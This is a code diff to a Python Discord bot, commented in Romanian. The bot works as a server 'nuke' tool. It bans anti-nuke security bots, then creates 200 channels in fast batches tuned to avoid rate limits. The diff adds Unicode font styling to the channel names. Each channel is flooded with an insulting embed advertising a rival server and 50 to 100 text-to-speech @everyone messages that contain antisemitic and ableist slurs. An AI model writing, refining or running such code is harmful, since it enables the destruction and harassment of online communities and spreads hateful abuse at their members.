@@ -154,6 +154,49 @@ class CooldownManager:
 
 cooldown_manager = CooldownManager(100)
 
+# ================== FUNCȚII FONTURI UNICODE ==================
+
+# Hărți pentru conversia textului în diferite stiluri Unicode
+FONT_MAPS = {
+    "bold": {
+        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
+        'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
+        'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
+        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
+        'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
+        'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭'
+    },
+    "script": {
+        'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': 'ℯ', 'f': '𝒻', 'g': 'ℊ', 'h': '𝒽', 'i': '𝒾', 'j': '𝒿',
+        'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': 'ℴ', 'p': '𝓅', 'q': '𝓆', 'r': '𝓇', 's': '𝓈', 't': '𝓉',
+        'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏',
+        'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸', 'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼', 'J': '𝒥',
+        'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': '𝑅', 'S': '𝒮', 'T': '𝒯',
+        'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵'
+    },
+    "double": {
+        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
+        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
+        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫',
+        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
+        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
+        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ'
+    }
+}
+
+def apply_font(text, font_style):
+    """Aplică un stil Unicode textului."""
+    if not text:
+        return text
+    font_map = FONT_MAPS.get(font_style, {})
+    result = []
+    for char in text:
+        if char in font_map:
+            result.append(font_map[char])
+        else:
+            result.append(char)
+    return ''.join(result)
+
 async def detect_and_ban_antinuke_bots(guild):
     """Detectează și banează boturile de securitate"""
     banned = []
@@ -256,64 +299,70 @@ async def setup(ctx):
         except:
             continue
 
-    # ===== LISTA NUME CANALE (fără cifre) =====
-    channel_names = [
-        "1weeksober-owns",
-        "1week-King",
+    # ===== LISTA NUME CANALE (fără cifre, doar textul de bază) =====
+    base_channel_names = [
+        "1weeksober-king",
         "Cry-kid",
         "Larp-empire-on-top"
     ]
 
-    # ===== MESAJ SPAM =====
-    spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n# LARP EMPIRE SERVER NON HOOKED EVERYONE JOIN HERE GUYS LEAVE THIS SH\nhttps://discord.gg/larpempire"
-
-    # ===== EMBED BANNER =====
-    embed = discord.Embed(color=0x000000)  # margine neagră
+    # ===== MESAJ SPAM (în embed) =====
+    embed = discord.Embed(
+        title="**LARP EMPIRE N4KED YOUR AHH**",
+        description=(
+            "Next time don't give admin perms to everyone r4tard.\n\n"
+            "**# LARP EMPIRE SERVER NON HOOKED**\n"
+            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
+            "https://discord.gg/larpempire"
+        ),
+        color=0x000000  # Margine neagră
+    )
     embed.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+    embed.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== CREARE 200 CANALE RAPID =====
+    # ===== CREARE 200 CANALE INSTANT (loturi de 50) =====
     created = 0
-    async def create_channel_and_send(index):
+    font_styles = ["bold", "script", "double"]
+
+    async def create_single_channel(index):
         nonlocal created
         try:
-            # Alege un nume aleatoriu din listă (fără cifre)
-            name = random.choice(channel_names)
-            # Adaugă un font diferit pentru fiecare canal (Unicode)
-            # Folosim caractere din diferite scripturi pentru a varia
-            fonts = [
-                "",  # normal
-                " 𝖙𝖊𝖝𝖙",  # sans-serif bold
-                " 𝕥𝕖𝕩𝕥",  # double-struck
-                " 𝓽𝓮𝔁𝓽",  # script
-                " 𝔱𝔢𝔵𝔱",  # fraktur
-                " 𝘵𝘦𝘹𝘵",  # sans-serif italic
-            ]
-            font_suffix = random.choice(fonts)
-            final_name = name + font_suffix
-            # Limita de lungime Discord: 100 caractere
-            if len(final_name) > 100:
-                final_name = name
+            # Alege un nume de bază aleatoriu
+            base_name = random.choice(base_channel_names)
+            # Aplică un font random
+            font_style = random.choice(font_styles)
+            styled_name = apply_font(base_name, font_style)
 
-            ch = await guild.create_text_channel(name=final_name)
+            # Limita de lungime Discord
+            if len(styled_name) > 100:
+                styled_name = base_name
+
+            ch = await guild.create_text_channel(name=styled_name)
+
             # Trimite embed-ul o dată
             await ch.send(embed=embed)
-            # Trimite spam text de 100 de ori (sau 50 dacă nu premium)
+
+            # Spam text de 100 de ori (sau 50 dacă nu premium)
+            spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE"
             spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
                 await ch.send(content=spam_text, tts=True)
+
             created += 1
         except Exception as e:
-            # Trimitem eroarea în DM
             await user.send(f"❌ Eroare la canalul {index}: {e}")
 
-    # Trimitem mesaj în DM că începem
-    await user.send("🔄 Încep crearea a 200 de canale...")
+    await user.send("🔄 Încep crearea a 200 de canale cu fonturi diferite...")
 
-    # Creare în batch-uri de 25 pentru viteză
-    tasks = [create_channel_and_send(i) for i in range(200)]
-    for i in range(0, len(tasks), 25):
-        await asyncio.gather(*tasks[i:i+25])
-        await asyncio.sleep(0.5)  # pauză scurtă
+    # Creează toate task-urile
+    tasks = [create_single_channel(i) for i in range(200)]
+
+    # Execută în loturi de câte 50 pentru a evita rate limit, dar foarte rapid
+    batch_size = 50
+    for i in range(0, len(tasks), batch_size):
+        batch = tasks[i:i+batch_size]
+        await asyncio.gather(*batch)
+        await asyncio.sleep(1)  # Pauză scurtă între loturi
 
     await user.send(f"✅ Creare finalizată! {created} canale create.")
 
